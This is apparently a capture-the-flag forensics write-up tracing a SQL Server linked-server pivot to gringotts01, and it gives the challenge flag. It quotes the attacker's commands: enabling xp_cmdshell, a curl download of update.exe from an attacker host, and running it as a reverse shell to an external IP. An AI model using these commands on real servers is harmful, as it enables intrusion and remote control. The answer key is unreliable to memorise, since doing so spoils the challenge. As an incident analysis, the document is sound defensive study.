# Operation Pensieve Breach 5 - Analysis

## Challenge Overview

A SQL Server linked server attack was used to gain administrative access to gringotts01.hogwarts.local. This analysis traces the complete attack chain through SQL Server Extended Events logs and Windows event logs.

**Flag**: `Hero{sa;GRINGOTTS02;http://192.168.56.200:8000/update.exe;445;192.168.56.200}`

## Evidence Files

| File | Description |
|------|-------------|
| `sqllogs_0_134083199634230000_2.xel` | SQL Server Extended Events log from GRINGOTTS01 |
| `gringotts01_winevt/` | Windows event logs from gringotts01 |
| `gringotts02_winevt/` | Windows event logs from gringotts02 |

## Network Topology

| Machine | IP Address | Role |
|---------|------------|------|
| GRINGOTTS01 | 192.168.56.101 | Target SQL Server (victim) |
| GRINGOTTS02 | 192.168.56.102 | Intermediate pivot point |
| Domain Controller | 192.168.56.100 | hogwarts.local DC |
| Attacker Infrastructure | 192.168.56.200 | Payload server & attack origin |
| External C2 | 51.75.120.170 | Reverse shell destination |

## Attack Chain

### Phase 1: Initial Access to GRINGOTTS02

The attacker connected to GRINGOTTS02's SQL Server from 192.168.56.200 using the `spellbook` SQL login.

**Evidence** (gringotts02 Application.evtx):
```
spellbook
 [CLIENT: 192.168.56.200]
```

### Phase 2: Linked Server Pivot to GRINGOTTS01

From GRINGOTTS02, the attacker used a pre-configured linked server to connect to GRINGOTTS01's SQL Server. The linked server was configured to authenticate as `sa` (SQL Server sysadmin).

**Evidence** (XEL file from GRINGOTTS01):
- `username`: `sa`
- `client_hostname`: `GRINGOTTS02`

The attacker verified their context by running:
```sql
select system_user as "username"
select system_user + SPACE(2) + current_user as "username"
```

### Phase 3: Enable xp_cmdshell

The attacker enabled the xp_cmdshell extended stored procedure to execute OS commands:

```sql
exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;
exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;
```

### Phase 4: Download Malicious Payload

Using xp_cmdshell, the attacker downloaded a reverse shell executable from their infrastructure:

```sql
exec master..xp_cmdshell 'curl -o "C:\tools\update1.exe" http://192.168.56.200:8000/update.exe'
```

### Phase 5: Execute Reverse Shell

The attacker executed the downloaded payload to establish a reverse shell to their external C2 server:

```sql
exec master..xp_cmdshell 'cmd /c "C:\tools\update1.exe --revshell 51.75.120.170 445"'
```

## Flag Components Breakdown

| Component | Value | Explanation |
|-----------|-------|-------------|
| Account | `sa` | SQL login used to execute xp_cmdshell on GRINGOTTS01 |
| NETBIOS Name | `GRINGOTTS02` | Machine from which linked server queries were issued |
| URL | `http://192.168.56.200:8000/update.exe` | Payload download URL |
| Port | `445` | Reverse shell port to external C2 |
| Internal IP | `192.168.56.200` | Origin of SQL queries (where spellbook connected from) |

## Key Insight

The "Internal IP address from which SQL queries are issued" (192.168.56.200) refers to the **true origin** of the attack - where the `spellbook` account connected from to GRINGOTTS02. This is distinct from 192.168.56.102 (GRINGOTTS02's IP), which was merely the intermediate pivot point in the linked server chain.

The attack flow was:
```
192.168.56.200 --[spellbook]--> GRINGOTTS02 --[sa via linked server]--> GRINGOTTS01
```

## Timeline

Based on timestamps in the logs:
- **2025-11-23T22:21:41Z**: spellbook login from 192.168.56.200 to GRINGOTTS02
- **2026-04-21T16:38:34Z**: Attack execution on GRINGOTTS01 (xp_cmdshell configuration)
- **2026-04-21T16:38:43Z**: Payload download and execution

## Tools Used for Analysis

- `strings -el` for extracting Unicode strings from binary log files
- Python scripts for parsing XEL binary structure
- Pattern matching to correlate events across multiple log sources
